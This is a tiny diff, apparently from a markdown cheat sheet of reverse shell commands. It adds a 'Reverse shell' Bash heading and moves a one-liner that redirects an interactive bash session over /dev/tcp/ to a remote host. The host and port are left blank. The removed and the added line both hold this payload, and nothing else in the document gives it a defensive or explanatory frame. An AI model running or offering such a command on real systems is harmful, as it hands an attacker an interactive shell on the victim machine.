@@ -63,4 +63,5 @@ ____
 
 ____
 
-<a name="Bash"></a>bash -c 'exec bash -i &>/dev/tcp// <&1'
+Reverse shell > <a name="Bash"></a>bash
+bash -c 'exec bash -i &>/dev/tcp// <&1'
